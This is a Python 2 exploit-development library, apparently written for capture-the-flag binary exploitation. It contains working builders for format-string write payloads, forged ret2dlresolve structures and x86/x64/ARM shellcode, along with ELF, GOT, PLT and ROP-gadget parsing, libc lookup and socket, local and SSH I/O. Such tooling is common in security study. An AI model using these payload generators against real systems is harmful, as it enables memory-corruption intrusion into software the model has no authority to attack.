#!/usr/bin/env python
import sys
import os
from string import strip
from struct import pack,unpack
from base64 import b64encode, b64decode
from time import sleep
import re

lhp     = ('www.shift-crops.net',4296)

NULL                = 0
# <unistd.h>
STDIN_FILENO        = 0
STDOUT_FILENO       = 1
STDERR_FILENO       = 2
SEEK_SET            = 0
SEEK_CUR            = 1
SEEK_END            = 2
# <bits/fcntl-linux.h>
O_RDONLY            = 00000
O_WRONLY            = 00001
O_RDWR              = 00002
O_CREAT             = 00100
O_APPEND            = 02000
# <bits/mman-linux.h>
PROT_NONE           = 0b000
PROT_READ           = 0b001
PROT_WRITE          = 0b010
PROT_EXEC           = 0b100
MAP_SHARED          = 0b001
MAP_PRIVATE         = 0b010
MAP_ANONYMOUS       = 0x20

PREV_INUSE          = 0b001
IS_MMAPED           = 0b010
IS_NON_MAINARENA    = 0b100

fsb_len     = lambda x:         "%6$"+str(x if x>0 else 0x10000+x)+"x" if x!=0 else ""
heap_sb     = lambda x,y:       (x&~0b111)|y
pack_8      = lambda x:         pack('<B' if x > 0 else '<b',x)
pack_16     = lambda x:         pack('<H' if x > 0 else '<h',x)
pack_32     = lambda x:         pack('<I' if x > 0 else '<i',x)
pack_64     = lambda x:         pack('<Q' if x > 0 else '<q',x)
unpack_8    = lambda x,s=False: unpack('<B' if not s else '<b',x)[0]
unpack_16   = lambda x,s=False: unpack('<H' if not s else '<h',x)[0]
unpack_32   = lambda x,s=False: unpack('<I' if not s else '<i',x)[0]
unpack_64   = lambda x,s=False: unpack('<Q' if not s else '<q',x)[0]
mold_32     = lambda x:         (x+'\x00'*(4-len(x)))[:4]
mold_64     = lambda x:         (x+'\x00'*(8-len(x)))[:8]
rol         = lambda val, r_bits, max_bits: \
              (val << r_bits%max_bits) & (2**max_bits-1) | \
              ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))
ror         = lambda val, r_bits, max_bits: \
              ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
              (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))
lib_path    = lambda p,l:     re.search(r'%s => ([^\s]+)' % l, LocalShell().get_output('ldd %s' % p)).group(1)

#==========

color       = {'N':9,'R':1,'G':2,'Y':3,'B':4,'M':5,'C':6,'W':7}
console     = {'bold'       : '\x1b[1m', \
               'c_color'    : lambda c: '\x1b[%dm'%(30+color[c]), \
               'b_color'    : lambda c: '\x1b[%dm'%(40+color[c]), \
               'reset'      : '\x1b[0m'}

template    = console['bold']+'%s%s%s'+console['reset']
message     = lambda c,t,x: sys.stderr.write(template % (console['c_color'](c), t, console['c_color']('N')+x) +'\n')
info        = lambda x:     message('B', '[+]', x)
proc        = lambda x:     message('G', '[*]', x)
warn        = lambda x:     message('Y', '[!]', x)
fail        = lambda x:     message('R', '[-]', x)

if os.name=='nt':
    try:
        from colorama import init as color_init
        color_init()
    except:
        fail('module "colorama" is not importable')

#==========

class Environment:
    def __init__(self, *envs):
        self.__env = None
        self.env_list = list(set(envs))
        for env in self.env_list:
            setattr(self, env, dict())

    def set_item(self, name, **obj):
        if obj.keys()!=self.env_list:
            fail('Environment : "%s" environment does not match' % name)
            return
        
        for env in obj:
            getattr(self, env).update({name:obj[env]})

    def select(self, env=None):
        if env is not None and env not in self.env_list:
            warn('Environment : "%s" is not defined' % env)
            env = None
            
        while env is None:
            sel = raw_input('Select Environment\n%s ...' % str(self.env_list))
            if not sel:
                env = self.env_list[0]
            elif sel in self.env_list:
                env = sel
            else:
                for e in self.env_list:
                    if e.startswith(sel):
                        env = e
                        break

        info('Environment : set environment "%s"' % env)
        for name,obj in getattr(self, env).items():
            setattr(self, name, obj)
        self.__env = env

    def check(self, env):
        return self.__env == env

#==========

class LocalShell:
    def __init__(self, env=None):
        from subprocess import call, check_output

        self.__call         = call
        self.__check_output = check_output
        self.env            = env

    def call(self, cmd, output=True):
        cmd = cmd.split(' ')
        if not output:
            devnull = open(os.devnull, 'w')
            ret = self.__call(cmd, stdout=devnull, stderr=devnull, env=self.env)
            devnull.close()
        else:
            ret = self.__call(cmd, env=self.env)
        return ret

    def get_output(self, cmd):
        return self.__check_output(cmd.split(' '), env=self.env)

    def exists(self, cmd):
        try:
            self.call(cmd, False)
            return True
        except:
            return False

#==========
        
class Communicate:    
    def __init__(self, target, mode='SOCKET', disp=True, **args):
        self.disp = disp
        
        if mode not in ['SOCKET','LOCAL','SSH']:
            warn('Communicate : mode "%s" is not defined' % mode)
            info('Communicate : Set mode "SOCKET"')
            mode = 'SOCKET'
        self.mode = mode
        self.is_alive = True
        
        self.show_mode = None
        self.hexdump = None

        # for legacy exploit
        if isinstance(target, tuple):
            target = {'host':target[0], 'port':target[1]}
        elif isinstance(target, str):
            target = {'program':target}

        # environment
        if self.mode!='SOCKET':
            env_dict    = dict()
            env_str     = ''
            if 'env' in args and isinstance(args['env'] ,dict):
                env_dict.update(args['env'])
                for e in args['env'].items():
                    info('set env "%s": %s' % e)
                    env_str += '%s="%s" ' % e

        if self.mode=='SOCKET':
            import socket
            
            rhp = (target['host'],target['port'])
            if self.disp:
                proc('Connect to %s:%d' % rhp)
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(args['to'] if 'to' in args else 1.0)
            self.sock.connect(rhp)

            self.timeout = socket.timeout
            
        elif self.mode=='LOCAL':
            import subprocess
                        
            if self.disp:
                proc('Starting program: %s' % target['program'])
            if 'GDB' in args and isinstance(args['GDB'] ,(int,long)):
                shell = True
                wrapper = ('--wrapper env %s --' % env_str) if env_str else ''    
                target['program'] = 'gdbserver %s localhost:%d %s' % (wrapper, args['GDB'], target['program'])
            elif 'ASLR' in args and args['ASLR']==False:
                shell = True
                target['program'] = 'ulimit -s unlimited; %s setarch i386 -R %s' % (env_str, target['program'])
            else:
                shell = False
                target['program'] = target['program'].split(' ')

            self.wait = ('wait' in args and args['wait'])
                
            self.proc = subprocess.Popen(target['program'], shell=shell, env=env_dict, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            info('PID : %d' % self.proc.pid)
            self.set_nonblocking(self.proc.stdout)
            if target['program'][0]=='gdbserver':
                info(self.read_until()[:-1])
                proc(self.read_until()[:-1])
                info(self.read_until()[:-1])
                raw_input('Enter any key to continue...')

            self.timeout = None
            
        elif self.mode=='SSH':
            import paramiko
            import socket
            
            if self.disp:
                proc('Connect SSH to %s@%s:%d' % (target['username'],target['host'],target['port']))
            self.ssh = paramiko.SSHClient()
            self.ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            self.ssh.connect(target['host'], username=target['username'], password=target['password'], port=target['port'])
            self.channel = self.ssh.get_transport().open_session()
            self.channel.settimeout(args['to'] if 'to' in args else 1.0)
            #self.channel.get_pty()
            if 'program' in target:
                if 'ASLR' in args and args['ASLR']==False:
                    target['program'] = 'ulimit -s unlimited; %s setarch i386 -R %s' % (env_str, target['program'])
                elif env_str:
                    target['program'] = '%s %s' % (env_str, target['program'])
                self.channel.exec_command(target['program'])

            self.timeout = socket.timeout

    def set_show(self, mode=None):
        if mode in ['RAW', 'HEXDUMP']:
            self.show_mode = mode
        else:
            self.show_mode = None
            
        if self.show_mode=='HEXDUMP' and self.hexdump is None:
            try:
                from hexdump import hexdump
                self.hexdump = hexdump
            except:
                fail('module "hexdump" is not importable')
                self.show_mode = None;

    def show(self, c, t, data):
        sys.stdout.write(template % (console['c_color'](c), '\n[%s]' % t, ''))
        if self.show_mode=='RAW':
            sys.stdout.write(data)
        elif self.show_mode=='HEXDUMP':
            sys.stdout.write('\n')
            self.hexdump(data)

    def set_nonblocking(self,fh):
        import fcntl

        fd = fh.fileno()
        fl = fcntl.fcntl(fd, fcntl.F_GETFL)
        fcntl.fcntl(fd, fcntl.F_SETFL, fl | os.O_NONBLOCK)
        
    def send(self,msg):
        if self.show_mode is not None:
            self.show('C', 'SEND', msg)
            
        try:
            if self.mode=='SOCKET':
                self.sock.sendall(msg)
            elif self.mode=='LOCAL':
                self.proc.stdin.write(msg)
            elif self.mode=='SSH':
                self.channel.sendall(msg)
        except StandardError:
            self.is_alive = False

    def sendln(self,msg):
        self.send(msg+'\n')

    def sendnull(self,msg):
        self.send(msg+'\x00')
        
    def read(self,num=4):
        sleep(0.05)
        rsp = ''
        try:
            if self.mode=='SOCKET':
                rsp = self.sock.recv(num)
            elif self.mode=='LOCAL':
                rsp = self.proc.stdout.read(num)
            elif self.mode=='SSH':
                rsp = self.channel.recv(num)
        except StandardError:
            pass

        if self.show_mode is not None:
            self.show('Y', 'READ', rsp)
        return rsp

    def read_all(self):
        sleep(0.05)
        try:
            rsp = ''
            while True:
                if self.mode=='SOCKET':
                    rcv = self.sock.recv(512)
                elif self.mode=='LOCAL':
                    rcv = self.proc.stdout.read()
                elif self.mode=='SSH':
                    rcv = self.channel.recv(512)

                if rcv:
                    rsp += rcv
                else:
                    break
        except StandardError:
            pass
        
        if self.show_mode is not None:
            self.show('Y', 'READ', rsp)
        return rsp

    def read_until(self,term='\n',contain=True):
        rsp = ''
        while not (rsp.endswith(term) if isinstance(term, str) else any([rsp.endswith(x) for x in term])):
            try:
                if self.mode=='SOCKET':
                    rsp += self.sock.recv(1) 
                elif self.mode=='LOCAL':
                    rsp += self.proc.stdout.read(1)
                elif self.mode=='SSH':
                    rsp += self.channel.recv(1)
            except self.timeout:
                if not (rsp.endswith(term) if isinstance(term, str) else any([rsp.endswith(x) for x in term])):
                    warn('read_until: not end with "%s"(timeout)' % str(term).strip())
                break
            except StandardError:
                sleep(0.05)
        
        if self.show_mode is not None:
            self.show('Y', 'READ', rsp)
            
        if not contain:
            rsp = rsp[:rsp.rfind(term)]
        return rsp

    def __del__(self):
        if self.mode=='SOCKET':
            self.sock.close()
            if self.disp:
                proc('Network Disconnect...')
        elif self.mode=='LOCAL':
            if self.wait:
                self.proc.communicate(None)
            elif self.proc.poll() is None:
                self.proc.terminate()
            if self.disp:
                proc('Program Terminate...')
        elif self.mode=='SSH':
            self.channel.close()
            if self.disp:
                proc('Session Disconnect...')
                
        if self.disp:
            raw_input('Enter any key to close...')

#==========
        
class ELF:
    def __init__(self, path, mode='elftools', **args):
        self.path = path
        
        if mode not in ['elftools','binutils']:
            warn('ELF : mode "%s" is not defined' % mode)
            mode = None
        self.mode = mode

        if self.mode is None or self.mode=='elftools':
            try:
                from elftools.elf.elffile import ELFFile
                from elftools.elf.sections import SymbolTableSection

                self.__ELFFile              = ELFFile
                self.__symbolTableSection   = SymbolTableSection
                self.mode                   = 'elftools'
            except:
                fail('ELF : module "elftools" is not importable')
                self.mode = None

        if self.mode is None or self.mode=='binutils':
            lshell = LocalShell({'LANG':'en'})

            if lshell.exists('readelf'):
                self.__readelf  = lambda opt: lshell.get_output('readelf %s %s' % (opt, self.path))
                self.mode       = 'binutils'
            else:
                fail('ELF : command "readelf" is not callable')
                self.mode = None
                
            '''
            try:
                devnull = open(os.devnull, 'w')
                call('readelf', stdout=devnull, stderr=devnull)
                call('objdump', stdout=devnull, stderr=devnull)
                call('nm', stdout=devnull, stderr=devnull)
                devnull.close()

                env = {'LANG':'en'}
                self.__readelf  = lambda opt: check_output(['readelf', opt, self.path], env=env)
                self.__objdump  = lambda opt: check_output(['objdump', opt, self.path], env=env)
                self.__nm       = lambda opt: check_output(['nm', opt, self.path], env=env)
            except:
                pass
            '''

        if self.mode:
            self.initialize(args)

    def initialize(self, args):
        proc('Loading "%s"...' % self.path)

        if self.mode=='elftools':
            self.elf    = self.__ELFFile(open(self.path,'rb'))

            self.pie    = 'DYN' in self.elf.header.e_type
            self.arch   = self.elf.get_machine_arch().lower()
            
        elif self.mode=='binutils':
            h_elf       = self.__readelf('-h')
            pattern     = r'Type:\s+([^\n]+)\s+Machine:\s+([^\n]+)'

            m = re.search(pattern, h_elf)
            self.pie    = 'DYN' in m.group(1)
            self.arch   = m.group(2).lower().split()[-1]
        
        self.base   = args['base'] if 'base' in args and self.pie else 0
        
        self.__section                  = self.init_sections()
        self.__got                      = self.init_got()
        self.__plt                      = self.init_plt()
        self.__symbol, self.__function  = self.init_symbols()
        
        self.__list_gadgets             = self.init_ropgadget() if 'rop' in args and args['rop'] else None

    def init_sections(self):
        section = dict()
        
        if self.mode=='elftools':
            self.__list_sections = list(self.elf.iter_sections())
            
            for sec in self.__list_sections:
                section[sec.name]  = sec.header.sh_addr
                
        elif self.mode=='binutils':
            h_sections  = self.__readelf('-S')
            pattern     = r'\d] ([^ ]+)\D+([0-9a-f]+)'

            r = re.compile(pattern)
            for sec in r.findall(h_sections):
                section[sec[0]]  = int(sec[1],16)

        return section

    def init_got(self):
        got = dict()
        name_rel_plt = '.rel.plt' if self.arch in ['x86', '80386'] else '.rela.plt'

        if self.mode=='elftools':
            sec_rel_plt = self.elf.get_section_by_name(name_rel_plt)
            sym_rel_plt = self.__list_sections[sec_rel_plt.header.sh_link]

            for rel in sec_rel_plt.iter_relocations():
                sym_idx = rel.entry.r_info_sym
                sym     = sym_rel_plt.get_symbol(sym_idx)
                got[sym.name]  = rel.entry.r_offset

        elif self.mode=='binutils':
            h_reloc     = self.__readelf('-r')
            pattern     = r'([0-9a-f]+)  ([^ ]+[ ]+){3}(\w+)'
            
            for header in h_reloc.split('Relocation section'):
                if name_rel_plt in header:
                    h_rel_plt = header
                    break

            r = re.compile(pattern)
            for rel in r.findall(h_rel_plt):
                got[rel[2]]  = int(rel[0],16)
                
        return got

    def init_plt(self):
        addr_plt = self.__section['.plt']
        if self.arch in ('x86','x64','amd64','80386','x86-64'):
            header_size, entry_size = 0x10, 0x10

        '''
        sec_plt     = self.elf.get_section_by_name('.plt')
        plt = {u'resolve' : sec_plt.header.sh_addr}
        addr_plt_entry = sec_plt.header.sh_addr + header_size
        '''
        plt = {'resolve' : addr_plt}
        addr_plt_entry = addr_plt + header_size
        for name, addr in sorted(self.__got.items(), key=lambda x:x[1]):
            plt[name] = addr_plt_entry
            addr_plt_entry += entry_size

        return plt

    def init_symbols(self):
        symbol      = dict()
        function    = dict()

        if self.mode=='elftools':
            for sec in self.__list_sections:
                if not isinstance(sec, self.__symbolTableSection):
                    continue
                
                for sym in sec.iter_symbols():
                    if sym.entry.st_value:
                        if sym.entry.st_info['type'] == 'STT_FUNC':
                            function[sym.name]  = sym.entry.st_value
                        else:
                            symbol[sym.name]    = sym.entry.st_value

        elif self.mode=='binutils':
            h_symbol    = self.__readelf('-s')
            pattern     = r'\d+: ([0-9a-f]+)\s+\d+ (\w+)\D+\d+ ([^\s@]+)'

            r = re.compile(pattern)
            for sym in r.findall(h_symbol):
                if sym[1]=='FUNC':
                    function[sym[2]]  = int(sym[0],16)
                else:
                    symbol[sym[2]]  = int(sym[0],16)

        return symbol, function
        
    def init_ropgadget(self):
        try:
            from ropgadget.args import Args
            from ropgadget.core import Core
        except:
            fail('ELF : module "ropgadget" is not importable')
            return None

        c = Core(Args(('--console',)).getArgs())
        c.do_binary(self.path, True)
        c.do_load(None, True)

        __list_gadgets = list()
        for gadget in c.gadgets():
            __list_gadgets += [{'gadget':map(strip, gadget['gadget'].split(';')), 'addr':gadget['vaddr']}]
        return __list_gadgets

    def set_location(self, symbol, addr):
        if not self.pie:
            fail('ELF : "%s" is not PIE' % self.path)
            return

        if self.base:
            warn('ELF : Base address is already set')

        if symbol in self.__function:
            self.base = addr - self.__function[symbol] 
        elif symbol in self.__symbol:
            self.base = addr - self.__symbol[symbol]
        else:
            fail('ELF : symbol "%s" not found' % symbol)
            return
        
        info('"%s" is loaded on 0x%08x' % (self.path, self.base))
        if self.base & 0xfff:
            warn('ELF : Base address(%s) is maybe wrong' % self.path)

    def search(self, data, *section):
        if self.mode=='elftools':
            if len(section):
                section = list(self.elf.get_section_by_name(k) for k in section)
            else:
                section = self.__list_sections

            for sec in section:
                if data in sec.data():
                    return self.base + sec.header.sh_addr + sec.data().find(data)

        elif self.mode=='binutils':
            if len(section):
                warn('ELF : Section can not be specified')
            elf_data = open(self.path, 'rb').read()
            if data in elf_data:
                return self.base + binf.find(data)
            
        return None

    def section(self, name=None):
        if self.pie and not self.base:
            warn('ELF : Base address not set')
            
        if name is None:
            return self.__section
        elif name not in self.__section:
            fail('ELF : section "%s" not found' % name)
            return None
        
        return self.base + self.__section[name]

    def plt(self, name=None):
        if name is None:
            return self.__plt
        elif name not in self.__plt:
            fail('ELF : plt "%s" not found' % name)
            return None
        
        return self.base + self.__plt[name]

    def got(self, name=None):
        if name is None:
            return self.__got
        elif name not in self.__got:
            fail('ELF : got "%s" not found' % name)
            return None
        
        return self.base + self.__got[name]
    
    def function(self, name=None):
        if name is None:
            return self.__function
        elif name not in self.__function:
            fail('ELF : function "%s" not found' % name)
            return None
        
        return self.base + self.__function[name]

    def symbol(self, name=None):
        if name is None:
            return self.__symbol
        elif name not in self.__symbol:
            fail('ELF : symbol "%s" not found' % name)
            return None
        
        return self.base + self.__symbol[name]

    def ropgadget(self, *keyword):
        if self.__list_gadgets is None:
            fail('ELF : No ROPgadgets loaded')
            return None

        for g in self.__list_gadgets:
            if len(keyword)!=len(g['gadget']):
                continue

            for i in range(len(keyword)):
                if not keyword[i] in g['gadget'][i]:
                    break
                if i==len(keyword)-1:
                    return self.base + g['addr']
                
        fail('ELF : ROPgadgets "%s" not found...' % str(keyword))
        return None

#==========
    
class libcDB:
    def __init__(self, libc_id=None, **symbol):
        import urllib2
        
        self.url = 'libcdb.com'
        self.urllib2 = urllib2
        self.libc_id = libc_id if libc_id else self.libc(symbol.items())

    def libc(self, symbols):
        if len(symbols)<2:
            fail('numbler of symbols must be greater than 2')
            return None
        
        symA = 'symbolA=%s&addressA=0x%x' % symbols[0]
        symB = 'symbolB=%s&addressB=0x%x' % symbols[1]

        search_url = 'http://%s/search?%s&%s' % (self.url, symA, symB)
        rsp     = self.urllib2.urlopen(search_url)
        data    = rsp.read()

        if 'no items found' in data:
            fail('no libc found')
            return None
        
        r = re.compile('<a href="/libc/([0-9]+)">Libc: ([a-z0-9._-]+)</a></li>')
        libc_list = dict()
        for libc in r.findall(data):
            if (self.symbol(symbols[0][0], int(libc[0]))^symbols[0][1])&0xfff == 0:
                libc_list[int(libc[0])]=libc[1]

        if not len(libc_list):
            fail('no libc found')
            return None
        elif len(libc_list)>1:
            sys.stdout.write('Select libc\n')
            for libc in libc_list.items():
                sys.stdout.write('%d : %s\n' % libc)
                
            libc_id = None
            while libc_id not in libc_list:
                libc_id = int(raw_input('... '))
        else:
            libc_id = libc_list.keys()[0]
            
        info('libc "%s" found' % libc_list[libc_id])
        return libc_id

    def symbol(self, name, libc_id=None):
        if libc_id is None:
            libc_id = self.libc_id
        if libc_id is None:
            return None
        
        search_url = 'http://%s/libc/%d/symbols?name=%s' % (self.url, libc_id, name)
        rsp     = self.urllib2.urlopen(search_url)
        data    = rsp.read()

        if 'no symbols found' in data:
            fail('no symbols found')
            return None

        r = re.compile('<dt>%s</dt>\n[ ]*<dd>libc_base \+ (0x[0-9a-f]+)</dd>' % name)
        return int(r.search(data).group(1),16)

    def string(self, needle, libc_id=None):
        if libc_id is None:
            libc_id = self.libc_id
        if libc_id is None:
            return None
        
        search_url = 'http://%s/libc/%d/strings?needle=%s' % (self.url, libc_id, needle)
        rsp     = self.urllib2.urlopen(search_url)
        data    = rsp.read()

        if 'no strings found' in data:
            fail('no strings found')
            return None

        r = re.compile('<li>libc_base \+ (0x[0-9a-f]+)</li>')
        return int(r.search(data).group(1),16)

    def download(self, fname=None, libc_id=None):
        if libc_id is None:
            libc_id = self.libc_id
        if libc_id is None:
            return None

        detail_url = 'http://%s/libc/%d' % (self.url, libc_id)
        rsp     = self.urllib2.urlopen(detail_url)
        data    = rsp.read()

        r = re.compile('<a href="/media/libcs/([a-z0-9._-]+)">')
        libc_name = r.search(data).group(1)

        if fname is None:
            fname = libc_name
        if os.path.isfile(fname):
            warn('"%s" already exists' % fname)
            return fname
        
        proc('Downloading "%s" to "./%s"' % (libc_name, fname))        
        download_url = 'http://%s/media/libcs/%s' % (self.url, libc_name)
        rsp     = self.urllib2.urlopen(download_url)
        data    = rsp.read()

        open(fname, 'wb').write(data)
        
        return fname
        
#==========

class FSB:
    def __init__(self,header=0,count=None,gap=0,size=2,debug=False):
        self.adrval = {}
        self.padding= False
        self.debug  = debug

        gap %= 4
        header_pad = (4 - header%4) % 4
        if header_pad:
            warn('FSB : header size is not a multiple of 4')
            info('FSB : Auto padding size is 0x%d bytes' % header_pad)
            header += header_pad
        if gap or header_pad:
            self.padding = True
            warn('FSB : Use "get()" to generate exploit')
        
        self.__fsb  = '@'*(gap + header_pad)
        self.header = header
        self.count  = (header if count is None else header_pad+count) + gap
        
        if size == 1:
            self.wfs = 2        # %hhn
            self.fr  = 0x100
        elif size == 4:
            self.wfs = 0        # %n
            self.fr  = 0x1000000
        else:
            if size != 2:
                warn('FSB : Unit size %d bytes is invalid' % size)
                info('FSB : Set unit size 2 bytes')
                size = 2
            self.wfs = 1        # %hn
            self.fr  = 0x10000
        self.size   = size

    def get(self):
        return self.__fsb

    def gen(self,fsb):
        n_idx = fsb.find('\x00')
        if n_idx >= 0:
            warn('FSB(gen) : null character detected(%d)' % (len(self.__fsb)+n_idx+1))
        self.__fsb += fsb
        return '' if self.padding else fsb
    
    def addr(self,adr):
        self.count += 4
        adr = pack_32(adr)
        return self.gen(adr)

    def write(self,index,value):
        x = value - self.count
        #fsb  = '%%%d$%dc' % (1, x if x>0 else self.fr+x) if x else ''
        fsb  = '%%%dc' % (x if x>0 else self.fr+x) if x else ''
        fsb += '%%%d$%sn' % (index + self.header/4, 'h'*self.wfs)
        self.count = value
        return self.gen(fsb)

    def set_adrval(self, addr, value):
        self.adrval.update({addr:value})

    def auto_write(self,index):
        adr = pld = ''
        d = {}
        l = []
        for a, v in self.adrval.items():
            if self.size == 1:
                div = {a:v&0xff, a+1:(v>>0x8)&0xff, a+2:(v>>0x10)&0xff, a+3:(v>>0x18)&0xff}
            elif self.size == 4:
                div = {a:v}
            else:
                div = {a:v&0xffff, a+2:v>>0x10}
            d.update(div)
            
        start_count = self.count + len(d)*4
        for a, v in d.items():
            if v < start_count:
                d[a]+=1<<self.size*8
                
        for a, v in sorted(d.items(), key=lambda x:x[1]):
            if self.debug:
                print ('0x%%08x <- 0x%%%02dx' % (self.size*2)) % (a,v)
            adr += self.addr(a)
            l+=[v]
        for value in l:
            pld += self.write(index,value)
            index += 1
        if self.debug:
            print pld
        
        return adr+pld

#==========

class DLresolve:
    def __init__(self, arch, addr_dynsym, addr_dynstr, addr_relplt, addr_version=None):
        if arch not in ['x86','x86_64','amd64']:
            warn('DLresolve : Architecture "%s" is not defined' % arch)
            info('DLresolve : Set arch "x86"')
            arch = 'x86'
        self.reloc_offset   = {}
        self.funcadr        = {}
        self.arch           = arch
        self.addr_dynsym    = addr_dynsym
        self.addr_dynstr    = addr_dynstr
        self.addr_relplt    = addr_relplt
        self.addr_version   = addr_version

    def set_funcadr(self, addr, dynstr):
        self.funcadr.update({dynstr:addr})
    
    def resolve(self,addr_buf):
        d = {}
        dynstr = dynsym = relplt =''
        
        addr_buf_dynstr      = addr_buf
        for s,a in self.funcadr.items():
            d.update({s:len(dynstr)})
            dynstr += s+'\x00'
        
        addr_buf_dynsym      = addr_buf_dynstr + len(dynstr)
        if self.arch == 'x86':
            align_dynsym         = (0x10-(addr_buf_dynsym - self.addr_dynsym)%0x10)%0x10
        elif self.arch in ['x86_64','amd64']:
            align_dynsym         = (0x18-(addr_buf_dynsym - self.addr_dynsym)%0x18)%0x18
        addr_buf_dynsym     += align_dynsym
            
        for s,of in d.items():
            if self.arch == 'x86':
                dynsym  += pack_32(addr_buf_dynstr + of - self.addr_dynstr)
                dynsym  += pack_32(0)
                dynsym  += pack_32(0)
                dynsym  += pack_32(0x12)
            elif self.arch in ['x86_64','amd64']:
                dynsym  += pack_32(addr_buf_dynstr + of - self.addr_dynstr)
                dynsym  += pack_32(0x12)
                dynsym  += pack_64(0)
                dynsym  += pack_64(0)
                
        addr_buf_relplt      = addr_buf_dynsym + len(dynsym)
        if self.arch == 'x86':
            align_relplt     = 0
            r_info           = (addr_buf_dynsym - self.addr_dynsym) / 0x10
        elif self.arch in ['x86_64','amd64']:
            align_relplt     = (0x18-(addr_buf_relplt - self.addr_relplt)%0x18)%0x18
            r_info           = (addr_buf_dynsym - self.addr_dynsym) / 0x18
        addr_buf_relplt     += align_relplt

        if self.addr_version is not None:
            warn('check gnu version : [0x%08x] & 0x7fff' % (self.addr_version+r_info*2))
        
        for s,a in self.funcadr.items():
            if self.arch == 'x86':
                self.reloc_offset.update({s : addr_buf_relplt + len(relplt) -self.addr_relplt})
                relplt  += pack_32(a)
                relplt  += pack_32(r_info << 8 | 0x7)
            elif self.arch in ['x86_64','amd64']:
                self.reloc_offset.update({s : (addr_buf_relplt + len(relplt) -self.addr_relplt)/0x18})
                relplt  += pack_64(a)
                relplt  += pack_32(0x7)
                relplt  += pack_32(r_info)
                relplt  += pack_64(0)
            r_info  += 1

        if align_dynsym:
            info('DLresolve : Auto padding dynsym size is 0x%d bytes' % align_dynsym)
        if align_relplt:
            info('DLresolve : Auto padding relplt size is 0x%d bytes' % align_relplt)
            
        return dynstr + '@'*(align_dynsym) + dynsym + '@'*(align_relplt) + relplt

    def offset(self,dynstr):
        if dynstr in self.reloc_offset:
            return self.reloc_offset[dynstr]
        else:
            warn('dynstr "%s" does not exist.' % dynstr)
            exit()

#==========

class ShellCode:        
    def __init__(self,arch='x86', max_len=None, null_free=False):
        self.__shellcode  = ''
        if arch not in ['x86','x86_64','amd64','arm']:
            warn('ShellCode(init) : Architecture "%s" is not defined' % arch)
            info('ShellCode(init) : Set arch "x86"')
            arch = 'x86'

        self.init_sys_no(arch)
        self.arch       = arch
        self.max_len    = max_len
        self.null_free  = null_free
        self.initialized= False

    def init_sys_no(self, arch):
        if arch in ['x86','arm']:
            self.sys_no = {'exit':0x01, 'fork':0x02, 'read':0x03, 'write':0x04, 'open':0x05, 'close':0x06, 'execve':0x0b, 'dup2':0x3f, 'mmap':0x5a, 'mmap2':0xc0, 'munmap':0x5b, 'mprotect':0x7d, 'vfork':0xbe, 'geteuid':0xc9, 'setreuid':0xcb}
        elif arch in ['x86_64','amd64']:
            self.sys_no = {'exit':0x3c, 'fork':0x39, 'read':0x00, 'write':0x01, 'open':0x02, 'close':0x03, 'execve':0x3b, 'dup2':0x21, 'mmap':0x09, 'munmap':0x0b, 'mprotect':0x0a, 'vfork':0x3a, 'geteuid':0x6b, 'setreuid':0x71}
        else:
            fail('cannot initialize systemcall number')
            self.sys_no = None

    def get(self):
        return self.__shellcode

    def gen(self,code):
        if not self.initialized and self.arch == 'arm':
            warn('ShellCode : You need to call start() if CPU mode is not thumb.')
 
        if self.max_len is not None and self.max_len < len(self.__shellcode+code):
            warn('ShellCode(gen) : Length exceeds 0x%x bytes' % self.max_len)
            return ''

        if self.null_free:
            n_idx = code.find('\x00')
            if n_idx >= 0:
                warn('ShellCode(gen) : null character detected(%d)' % (len(self.__shellcode)+n_idx+1))
        n_idx = code.find('\x0a')
        if n_idx >= 0:
            warn('ShellCode(gen) : LF character detected(%d)' % (len(self.__shellcode)+n_idx+1))
            
        self.__shellcode += code
        return code

    def padding(self,pad_size=None,word='\x90'):
        if pad_size is None:
            if self.max_len is not None:
                pad_size = self.max_len - len(self.__shellcode)
                info('ShellCode(padding) : Auto padding size is 0x%x bytes' % pad_size)
            else:
                warn('ShellCode(padding) : Padding size is not declared')
                return ''
        return self.gen((word * (pad_size/len(word)+1))[:pad_size])

    def start(self):
        self.initialized = True
        asm = ''
        if self.arch == 'x86':
            asm += ''
        elif self.arch in ['x86_64','amd64']:
            asm += ''
        elif self.arch == 'arm':
            asm += "\x01\x30\x8f\xe3" # orr   r3, pc, 1
            asm += "\x13\xff\x2f\xe1" # bx    r3
        return self.gen(asm)

    def change_cpu_mode(self, nw_arch, change=True):
        if nw_arch not in ['x86','x86_64','amd64']:
            return ''
        
        asm = ''
        if self.arch == 'x86':
            if nw_arch == 'x86':
                warn('CPU_mode is already "x86"')
            elif nw_arch in ['x86_64','amd64']:
                if change:
                    info('chage CPU_mode "x86" to "amd64"')
                    self.init_sys_no(nw_arch)
                    self.arch = nw_arch
                asm += '\x6a\x33'               # push 0x33
                asm += '\xe8\x00\x00\x00\x00'   # call 0
                asm += '\x83\x04\x24\x05'       # add dword ptr [esp], 0x5
                asm += '\xcb'                   # retf
        elif self.arch in ['x86_64','amd64']: 
            if nw_arch == 'x86':
                if change:
                    info('chage CPU_mode "amd64" to "x86"')
                    self.init_sys_no(nw_arch)
                    self.arch = nw_arch
                asm += '\xe8\x00\x00\x00\x00'   # call 0
                asm += '\xc7\x44\x24\x04\x23\x00\x00\x00'
                                                # mov dword ptr [rsp+4], 0x23
                asm += '\x83\x04\x24\x0d'       # add dword ptr [rsp], 0xd
                asm += '\xcb'                   # retf
            elif nw_arch in ['x86_64','amd64']:
                warn('CPU_mode is already "amd64"')
        else:
            fail('cannot change CPU_mode "%s" to "%s"' % (self.arch, nw_arch))
            
        return self.gen(asm)

    def rval2arg(self,index):
        asm = ''
        if index<7:
            if self.arch == 'x86':
                ebx = 0xc3
                d   = (0,2,1,5,4,6)
                asm += '\x89'+chr(ebx^d[index-1])   # mov    ebx/ecx/edx/esi/edi/ebp, eax
            elif self.arch in ['x86_64','amd64']:
                rdi = 0xc7
                d   = (0,1,5,5,7,6)
                prefix = ('\x48','\x48','\x48','\x49','\x49','\x49')
                asm += prefix[index-1]+'\x89'+chr(rdi^d[index-1])
                                                    # mov    rdi/rsi/rdx/r10/r8/r9,  rax
            elif self.arch == 'arm':
                if index > 1:
                    asm += chr(index-1)+'\x1c'      # adds   r1/r2/r3/r4/r5, r0, #0
        return self.gen(asm)

